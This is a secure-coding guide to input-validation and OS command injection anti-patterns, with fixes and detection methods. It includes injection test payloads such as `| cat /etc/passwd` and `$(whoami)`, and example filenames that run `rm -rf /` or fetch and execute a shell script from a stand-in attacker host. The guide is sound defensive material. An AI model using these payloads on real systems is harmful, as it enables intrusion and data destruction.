# Anti-patterns: Input Validation & OS Command Injection

Security anti-patterns related to input handling, injection prevention, error disclosure, and API data exposure — with dedicated coverage of OS command injection, where user input is incorporated into shell commands executed by the server. CISA issued a dedicated Secure by Design Alert for this vulnerability class because it keeps appearing despite being theoretically solved. The complexity lies in metacharacter diversity across shells, encoding evasion, and developers using shell execution for tasks with safe library alternatives.

## Trust the Client — Critical

**Signs**: Authorization checks performed only in the frontend. Price or quantity validated in JavaScript before sending to the server. Hidden form fields or disabled buttons used as security controls. JWT tokens decoded but not verified server-side. Admin functionality hidden behind UI routing but accessible via direct API calls.

**Impact**: Any attacker with a browser's developer tools or a proxy (Burp Suite, mitmproxy) bypasses all controls. Price manipulation in e-commerce. Privilege escalation via direct API calls. Data exfiltration by modifying client-side queries. This is the #1 pattern behind IDOR vulnerabilities.

**Fix**: Enforce all security decisions server-side. Client-side validation is for UX only — never for security. Every API endpoint must independently verify authentication, authorization, and input validity. Assume the client is fully compromised. Test by calling APIs directly without the UI.

**Detection**:
- *Code patterns*: Authorization logic only in frontend components (React/Vue guards without API middleware); price/quantity/discount fields accepted from client without server recalculation; JWT decoded but not verified (`jwt.decode` without `verify=True`)
- *Review questions*: If I call the API directly (bypassing the UI), does every security check still apply? Are business rules (pricing, limits) enforced server-side?
- *Test methods*: Call every API endpoint directly with curl/Postman, bypassing the UI. Modify client-side values (prices, user IDs, roles) and verify the server rejects invalid values

---

## Input Validation Theater — Major

**Signs**: Frontend validation with corresponding `if` statement in backend that only checks one condition. Allowlisting file extensions but not validating file content (MIME type, magic bytes). SQL parameterized queries for some endpoints but raw string concatenation for "internal" ones. Regex-based XSS filtering instead of proper output encoding.

**Impact**: Bypassed validation is often worse than no validation because it gives false confidence. Incomplete injection prevention means attackers simply find the endpoint that was missed. File upload validation on extension only allows polyglot file attacks.

**Fix**: Validate all inputs server-side with a centralized validation framework. Use parameterized queries for ALL database access — no exceptions. Apply context-specific output encoding (HTML entities, URL encoding, JS string escaping). Validate file uploads by content type, magic bytes, and size — not just extension.

**Detection**:
- *Code patterns*: Regex-based XSS filtering (blocklist) instead of output encoding; some endpoints use parameterized queries while others use string concatenation; file upload checks `.endsWith('.jpg')` without magic byte validation
- *Review questions*: Is input validation centralized or per-endpoint? Are there any raw SQL queries? Does file upload validation check content type or just extension?
- *Test methods*: Search for raw SQL concatenation across the codebase. Test file upload with renamed extensions (`.php` renamed to `.jpg`). Test XSS with encoding variations that bypass regex filters

---

## Error Message Oracle — Major

**Signs**: Stack traces in production error responses. Different error messages for "user not found" vs "wrong password." Database error messages exposing table/column names. API responses that reveal internal service names, versions, or file paths. Verbose error details in 4xx/5xx responses.

**Impact**: Attackers use differentiated error messages to enumerate valid usernames, map internal architecture, identify technology stack, and craft targeted attacks. Stack traces reveal file paths, dependency versions, and code structure. This information turns a blind attacker into an informed one.

**Fix**: Return generic error messages to clients ("Invalid credentials," "An error occurred"). Log detailed errors server-side with correlation IDs. Never expose stack traces, internal paths, or database errors to external users. Use identical response timing and messages for auth failures (prevents username enumeration).

**Detection**:
- *Code patterns*: Different error messages for "user not found" vs "wrong password"; exception details in HTTP response body; stack traces in catch blocks sent to client; database column names in error responses
- *Review questions*: Do authentication failure responses differ based on whether the username exists? Can error responses reveal internal architecture?
- *Test methods*: Compare error responses for valid-user-wrong-password vs invalid-user. Trigger server errors and check for stack traces. Measure response timing differences for auth failures (timing oracle)

---

## Oversharing APIs — Minor

**Signs**: API responses include all database fields, not just those needed by the client. User profile endpoints return email, phone, address even when only the name is needed. List endpoints return full objects instead of summaries. Internal IDs (auto-increment) exposed in responses.

**Impact**: Excessive data exposure (OWASP API3:2023). PII leaked to clients that do not need it. Internal IDs enable enumeration attacks. Larger attack surface for data breaches — more data exposed per compromised request.

**Fix**: Return only the fields the client needs (response filtering / DTO pattern). Use UUIDs instead of sequential IDs in API responses. Implement field-level access control for sensitive fields. Review API responses in integration tests for data minimization.

**Detection**:
- *Code patterns*: `SELECT *` or full model serialization without field filtering; auto-increment IDs in API responses; user endpoint returning email/phone when only name is needed
- *Review questions*: Does each API endpoint return only the fields the client needs? Are internal IDs (auto-increment) exposed in responses?
- *Test methods*: Compare API response fields against what the UI actually uses. Check for sequential IDs that enable enumeration. Verify sensitive fields (email, phone) are omitted from list endpoints

---

## Shell Invocation for Library Tasks — Critical

**Signs**: Using `os.system()`, `subprocess.run(shell=True)`, `Runtime.exec()`, `child_process.exec()`, or backtick operators to perform tasks that have safe library alternatives. Calling `ping` via shell instead of using a socket library. Using `curl` via shell instead of an HTTP client library. Shelling out for file operations (cp, mv, rm) instead of using filesystem APIs. Building image conversion commands with user-supplied filenames instead of using an image processing library.

**Impact**: Every shell invocation with user-influenced input is a potential command injection vector. Shell metacharacters (`;`, `|`, `&`, `$()`, `` ` ``) in any argument can execute arbitrary commands. Even when arguments are "sanitized," the diversity of metacharacters across shells (bash, sh, cmd.exe, PowerShell) makes blocklist approaches unreliable. CISA specifically calls this out as a preventable-by-design vulnerability.

**Fix**: Replace shell invocations with language-native library calls. File operations: use `os`/`shutil` (Python), `fs` (Node.js), `nio.file` (Java). HTTP requests: use `requests`/`urllib` (Python), `fetch`/`axios` (Node.js), `HttpClient` (Java). DNS lookups: use `socket.getaddrinfo()` or `dns.lookup()`. Image processing: use Pillow, Sharp, or ImageMagick bindings (not CLI). If shell invocation is truly unavoidable, use `subprocess.run()` with a list of arguments (no `shell=True`) or `execFile` instead of `exec` in Node.js.

**Detection**:
- *Code patterns*: `os.system()`, `subprocess.run(..., shell=True)`, `subprocess.Popen(..., shell=True)` in Python; `Runtime.getRuntime().exec(stringCmd)` in Java; `child_process.exec()` in Node.js; backtick operators in Ruby/Perl; `system()`, `popen()` in C/C++
- *Review questions*: Can the shell invocation be replaced with a library call? If shell is required, is `shell=True` actually needed or can a list of arguments be used instead?
- *Test methods*: Search codebase for all shell invocation functions. For each, determine if a library alternative exists. Test remaining shell calls with metacharacter payloads: `; id`, `| cat /etc/passwd`, `$(whoami)`, `` `whoami` ``

---

## Metacharacter Blocklisting — Critical

**Signs**: Attempting to prevent command injection by removing or escaping specific shell metacharacters from user input. Blocklist approaches that filter `;`, `|`, `&` but miss `$()`, backticks, newlines (`\n`), or null bytes. Using regex to strip "dangerous characters" before passing input to a shell command. Platform-specific escaping that works on Linux but fails on Windows (or vice versa).

**Impact**: Shell metacharacter diversity makes blocklists fundamentally unreliable. Beyond the obvious `;`, `|`, `&`, attackers can use: command substitution `$()` and backticks, newline injection (`%0a`), null byte injection (`%00`), variable expansion (`$IFS` as a space substitute), brace expansion (`{cat,/etc/passwd}`), glob patterns, here-strings, and process substitution. Different shells (bash, dash, zsh, cmd.exe, PowerShell) support different metacharacters. Encoding variations (URL encoding, Unicode, hex) bypass string-matching filters.

**Fix**: Use allowlist validation — define what characters ARE allowed, not what is forbidden. For filenames: allow only `[a-zA-Z0-9._-]`. For command arguments: use parameterized execution (argument lists, not shell strings). When escaping is needed, use the language's built-in shell escaping: `shlex.quote()` in Python, `shellescape` in Ruby, but prefer argument lists over escaping. Never build shell command strings from user input.

**Detection**:
- *Code patterns*: Regex patterns that strip shell metacharacters (`input.replace(/[;&|]/g, '')`); blocklist arrays of "dangerous characters"; custom escaping functions for shell arguments; different sanitization on different platforms
- *Review questions*: Is the approach allowlist-based or blocklist-based? Does the blocklist cover all metacharacters for the target shell? Has the sanitization been tested with encoding variations?
- *Test methods*: Test with metacharacters not in the blocklist: `$()`, backticks, `\n`, `$IFS`, brace expansion. Test with URL-encoded and Unicode variants. Test on both Linux and Windows if cross-platform. Use command injection fuzzing wordlists (e.g., PayloadsAllTheThings)

---

## Indirect Injection via Filenames — Major

**Signs**: User-uploaded filenames passed to shell commands without sanitization. Image processing commands that include the original filename: `convert {filename} output.png`. Archive extraction commands using user-supplied archive names. Log processing commands that include user-controlled log file names. Any command that uses a filename from an untrusted source as an argument.

**Impact**: Filenames are a frequently overlooked injection vector. A file named `; rm -rf /;.jpg` or `$(curl attacker.com/shell.sh|sh).png` passes most file extension checks but injects commands when the filename is used in a shell command. Filenames with spaces, quotes, or special characters break argument parsing. On some systems, filenames starting with `-` are interpreted as command flags (argument injection): a file named `-rf` passed to `rm` becomes `rm -rf`.

**Fix**: Never use user-supplied filenames in shell commands. Generate random filenames (UUID) for stored files and maintain a mapping. If the original filename must be preserved, use allowlist validation (`[a-zA-Z0-9._-]` only) and reject or rename files with other characters. When passing filenames to commands, use argument lists (not shell strings) and prefix with `./` to prevent argument injection (`-rf` becomes `./-rf`). Use `--` to signal end of options before filename arguments.

**Detection**:
- *Code patterns*: User-uploaded `filename` variable in shell command strings; `os.system(f"convert {upload.filename} ...")` patterns; archive extraction commands with user-controlled names; missing filename sanitization between upload and processing
- *Review questions*: Are user-uploaded filenames used directly in any shell commands? Are filenames sanitized to an allowlist of safe characters? Can filenames starting with `-` be interpreted as command flags?
- *Test methods*: Upload files with shell metacharacters in the name: `; id ;.jpg`, `$(whoami).png`, `| cat /etc/passwd |.txt`. Upload files starting with `-`: `-rf.txt`, `--help.jpg`. Check if the application generates random filenames or uses originals in processing

---

## Environment Variable Injection — Major

**Signs**: User input that influences environment variables passed to child processes. Setting `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, `PYTHONPATH`, or `PERL5LIB` based on user-controlled values. Web frameworks that expose HTTP headers as environment variables (CGI-style). Server configurations where environment variables are set from request headers or query parameters.

**Impact**: Environment variables control process behavior in ways that enable code execution. `LD_PRELOAD` loads an attacker-supplied shared library before any other. `PATH` manipulation makes the process execute attacker-controlled binaries. `NODE_OPTIONS=--require=./malicious.js` forces Node.js to load arbitrary code. `PYTHONPATH` causes Python to import attacker-controlled modules. `PERL5LIB` enables Perl module hijacking. CGI-based applications historically converted HTTP headers to environment variables (the Shellshock vulnerability exploited this pattern).

**Fix**: Never set security-sensitive environment variables from user input. Hardcode `PATH` in application startup to a known-safe value. Strip or ignore `LD_PRELOAD`, `LD_LIBRARY_PATH`, `NODE_OPTIONS`, `PYTHONPATH` in the process environment. Validate all environment variable values with allowlists. For CGI-style applications, filter environment variable names to a known-safe set. Use process isolation (containers, sandboxes) to limit the impact of environment variable manipulation.

**Detection**:
- *Code patterns*: `os.environ[user_input]` or `process.env[user_key] = user_value`; CGI scripts that access `os.environ` based on HTTP headers; child process spawning with environment inherited from untrusted sources; `env` parameter in process creation functions populated with user data
- *Review questions*: Can any user input influence environment variables? Are security-sensitive environment variables (PATH, LD_PRELOAD, NODE_OPTIONS) protected from modification? Does the application use CGI-style header-to-environment mapping?
- *Test methods*: Set HTTP headers that map to environment variables (e.g., `X-Custom: value` becomes `HTTP_X_CUSTOM`) and check if they influence process behavior. Test `LD_PRELOAD` and `PATH` injection if the application spawns child processes. Check for Shellshock-style vulnerabilities in CGI environments

---

## Embedded Device Passthrough — Major

**Signs**: IoT or embedded device management interfaces that pass user input directly to underlying OS commands. Network configuration interfaces that call `ifconfig`, `iptables`, or `route` with user-supplied parameters. Diagnostic tools that run `ping`, `traceroute`, or `nslookup` with user-provided hostnames. Firmware update mechanisms that use shell commands with user-supplied file paths. Admin panels for routers, cameras, or industrial control systems that expose shell command execution through web interfaces.

**Impact**: Embedded devices frequently lack the security controls present in enterprise systems: no WAF, limited input validation libraries, outdated OS components, no security updates, default credentials, and root-level execution. Command injection on embedded devices often runs as root with no privilege separation. Compromised embedded devices serve as persistent network footholds (botnets like Mirai exploit exactly this pattern). The Mirai botnet compromised hundreds of thousands of IoT devices through command injection and default credentials.

**Fix**: Replace shell-based diagnostic commands with library implementations. Use libping instead of calling `ping`. Use netlink interfaces instead of `ifconfig`/`iptables` CLI. Implement strict allowlist validation on all user inputs in embedded interfaces: IP addresses must match `^\d{1,3}(\.\d{1,3}){3}$`, hostnames must match `^[a-zA-Z0-9.-]+$`. Run web interfaces as non-root with minimal capabilities. Apply mandatory access control (SELinux, AppArmor) even on embedded systems. Use chroot or container isolation for web-facing services.

**Detection**:
- *Code patterns*: Web handlers that call `system()`, `popen()`, or `exec()` with request parameters in embedded C/C++ code; CGI scripts that pass form fields to shell commands; busybox command invocations with user input; missing input validation in device management interfaces
- *Review questions*: Does the embedded device management interface pass user input to shell commands? Is the web interface running as root? Are there library alternatives to the shell commands being used? Is there any input validation framework in use?
- *Test methods*: Test all management interface fields with command injection payloads. Check if the web server process runs as root. Attempt to reach internal services or read files via injection. Verify whether the device is using up-to-date firmware with known CVE patches applied

---

## Summary

| Pattern | Severity | Primary Criterion | Applies To |
|---------|----------|------------------|------------|
| Trust the Client | Critical | A2: Authorization, A3: Input Validation | Both |
| Input Validation Theater | Major | A3: Input Validation | Both |
| Error Message Oracle | Major | A6: Secure Coding | Implementation |
| Oversharing APIs | Minor | A4: Data Protection | Implementation |
| Shell Invocation for Library Tasks | Critical | A3: Input Validation | Both |
| Metacharacter Blocklisting | Critical | A3: Input Validation | Both |
| Indirect Injection via Filenames | Major | A3: Input Validation | Implementation |
| Environment Variable Injection | Major | A3: Input Validation, A6: Secure Coding | Both |
| Embedded Device Passthrough | Major | A3: Input Validation | Both |
